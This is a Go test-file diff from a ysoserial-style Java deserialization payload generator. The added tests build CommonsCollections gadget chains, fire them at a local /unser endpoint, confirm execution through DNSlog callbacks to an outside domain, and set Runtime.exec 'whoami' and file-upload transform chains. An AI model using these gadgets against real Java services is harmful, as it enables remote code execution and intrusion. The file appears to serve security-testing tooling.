@@ -3,24 +3,136 @@ package yso
 import (
 	"fmt"
 	"github.com/yaklang/yaklang/common/javaclassparser"
+	"github.com/yaklang/yaklang/common/utils/lowhttp"
+	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
+	"github.com/yaklang/yaklang/common/yakgrpc/yakit"
 	"github.com/yaklang/yaklang/common/yserx"
+	"os"
 	"testing"
 )
 
-func TestGenerateGadget(t *testing.T) {
-	YsoConfigInstance, err := GetConfig()
+func SendPayload(payload []byte, opts ...lowhttp.LowhttpOpt) []byte {
+	opts = append(opts, lowhttp.WithPacketBytes(append([]byte("GET /unser HTTP/1.1\nHost: 127.0.0.1:8081\n\n"), payload...)))
+	rsp, err := lowhttp.HTTP(opts...)
+	if err != nil {
+		panic(err)
+	}
+	return rsp.RawPacket
+}
+func TestGadgetBaseExternal(t *testing.T) {
+	YsoConfigInstance, err := getConfig()
 	if err != nil {
 		t.Fatal(err)
 	}
-	for name, _ := range YsoConfigInstance.Gadgets {
-		gadget, err := setCommandForRuntimeExecGadget(name, "whoami")
-		if err != nil {
-			t.Fatal(err)
+	for name, gadget := range YsoConfigInstance.Gadgets {
+		var gadgetIns *JavaObject
+		if gadget.IsTemplate {
+			domain, token, err := yakit.NewDNSLogDomain()
+			if err != nil {
+				t.Fatal(err)
+			}
+			gadgetIns, err = GenerateGadget(name, SetDnslogEvilClass(domain))
+			if err != nil {
+				t.Fatal(err)
+			}
+			payload, err := ToBytes(gadgetIns)
+			if err != nil {
+				t.Fatal(err)
+			}
+			SendPayload(payload)
+			res, err := yakit.CheckDNSLogByToken(token, 3)
+			if err != nil || len(res) == 0 {
+				t.Fatalf("check gadget `%s` dnslog failed: %v", name, err)
+			}
+		} else {
+			//gadgetIns, err = GenerateGadget(name)
+			//if err != nil {
+			//	t.Fatal(err)
+			//}
+
 		}
-		_ = gadget
 	}
 }
 
+func TestParseCC6(t *testing.T) {
+	content, err := os.ReadFile("/Users/z3/Downloads/payload1.ser")
+	if err != nil {
+		t.Fatal(err)
+	}
+	content4, err := os.ReadFile("/Users/z3/Downloads/payload4.ser")
+	if err != nil {
+		t.Fatal(err)
+	}
+	serxs, err := yserx.ParseJavaSerialized(content)
+	ser := serxs[0]
+	serxs4, err := yserx.ParseJavaSerialized(content4)
+	ser4 := serxs4[0]
+	var transformInPayload4 yserx.JavaSerializable
+	WalkJavaSerializableObject(ser4, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
+		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
+			transformInPayload4 = objSer
+		}
+	})
+	_ = transformInPayload4
+	WalkJavaSerializableObject(ser, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
+		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
+			replace(transformInPayload4)
+		}
+	})
+	byts := yserx.MarshalJavaObjects(ser)
+	os.WriteFile("/Users/z3/Downloads/_payload1.ser", byts, 0777)
+}
+func TestGenerateGadgetByGadgetName(t *testing.T) {
+	gadget, err := GenerateGadget("CommonsCollections5", SetTransformChainType("upload_file_base64", "a.txt", "123"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	ser, err := ToBytes(gadget)
+	if err != nil {
+		t.Fatal(err)
+	}
+	println(codec.EncodeBase64(ser))
+}
+func TestGenerateGadgetByClassLoader(t *testing.T) {
+	classObj, err := GenDnslogClassObject("gqlxsqfoja.dgrh3.cn")
+	if err != nil {
+		t.Fatal(err)
+	}
+	classBytesCode, err := ToBytes(classObj)
+	if err != nil {
+		t.Fatal(err)
+	}
+	//println(codec.EncodeBase64(classBytesCode))
+	cfg, err := ConfigJavaObject("CommonsCollections2", SetClassBytes(classBytesCode))
+	if err != nil {
+		t.Fatal(err)
+	}
+	ser, err := ToBytes(cfg)
+	if err != nil {
+		t.Fatal(err)
+	}
+	println(codec.EncodeBase64(ser))
+}
+func TestGenerateGadget(t *testing.T) {
+	YsoConfigInstance, err := getConfig()
+	if err != nil {
+		t.Fatal(err)
+	}
+	for name, gadget := range YsoConfigInstance.Gadgets {
+		if gadget.IsTemplate {
+			_, err = ConfigJavaObject(name)
+			if err != nil {
+				t.Fatal(err)
+			}
+		} else {
+			gadget, err := setCommandForRuntimeExecGadget(name, "whoami")
+			if err != nil {
+				t.Fatal(err)
+			}
+			_ = gadget
+		}
+	}
+}
 func TestMUSTPASSSetMajorVersion(t *testing.T) {
 	type testCase struct {
 		version     uint16
@@ -102,7 +214,7 @@ func TestMUSTPASSSetMajorVersion(t *testing.T) {
 			}
 
 			found := false
-			WalkJavaSerializableObject(javaSerializables, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable) {
+			WalkJavaSerializableObject(javaSerializables, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
 				// Assuming the WalkJavaSerializableObject and other functions are defined elsewhere
 				handleJavaSerializable(objSer, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable) {
 					javaClass, ok := objSer.(*yserx.JavaArray)
